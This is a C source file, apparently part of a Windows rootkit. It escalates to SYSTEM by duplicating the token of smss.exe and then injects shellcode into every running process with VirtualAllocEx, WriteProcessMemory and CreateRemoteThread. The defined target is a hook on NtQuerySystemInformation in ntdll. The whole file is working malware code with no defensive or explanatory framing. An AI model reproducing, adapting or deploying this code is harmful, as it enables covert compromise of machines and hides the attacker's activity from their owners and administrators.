#include "rootkit.h"

#define SYSTEM_OWNED_PROCESS L"smss.exe"
#define TARGET_MODULE L"ntdll.dll"
#define TARGET_FUNCTION "NtQuerySystemInformation"

DWORD ForAllProcesses(DWORD (*Func)(PROCESSENTRY32))
{
	HANDLE snapshot;
	PROCESSENTRY32 process;
	DWORD ret;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot)
	{
		process.dwSize = sizeof(PROCESSENTRY32);

		Process32FirstW(snapshot, &process);

		do
		{
			ret = Func(process);
			if (ret) return ret;
		} while (Process32NextW(snapshot, &process));
	}

	return 0;
}

DWORD FindSystemOwnedProcess(PROCESSENTRY32 Process)
{
	if (!wcscmp(Process.szExeFile, SYSTEM_OWNED_PROCESS))
	{
		return Process.th32ProcessID;
	}

	return -1;
}

BOOL ElevateToSystem()
{
	BOOL status = FALSE;
	DWORD pid;
	HANDLE process, token, tokenCopy;

	pid = ForAllProcesses(FindSystemOwnedProcess);
	if (!pid) goto ret;
	
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!process) goto ret;

	if (!OpenProcessToken(process, TOKEN_DUPLICATE, &token))
		goto process;
	
	if (!DuplicateToken(token, SecurityImpersonation, &tokenCopy))
		goto token;
	
	if (!ImpersonateLoggedOnUser(tokenCopy))
		goto duplicate;

	status = TRUE;

duplicate:
	CloseHandle(tokenCopy);
token:
	CloseHandle(token);
process:
	CloseHandle(process);
ret:
	return status;
}

DWORD InjectIntoProcess(PROCESSENTRY32 Process)
{
	SIZE_T size;
	HANDLE process, thread;
	PVOID newFunction;

	size = (PBYTE)&ShellcodeEnd - (PBYTE)EnableRootkit;

	// do not hook yourself
	if (Process.th32ProcessID == GetCurrentProcessId()) goto ret;
	
	process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, Process.th32ProcessID);
	if (!process) goto ret;
	
	newFunction = VirtualAllocEx(process, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!newFunction) goto process;
	
	if (!WriteProcessMemory(process, newFunction, EnableRootkit, size, NULL))
		goto process;
	
	// invoke shellcode
	thread = CreateRemoteThread(process, NULL, 0, newFunction, NULL, 0, NULL);
	if (!thread) goto process;

	CloseHandle(thread);

process:
	CloseHandle(process);
ret:
	return 0;
}

void main()
{
	ElevateToSystem();

	ForAllProcesses(InjectIntoProcess);
}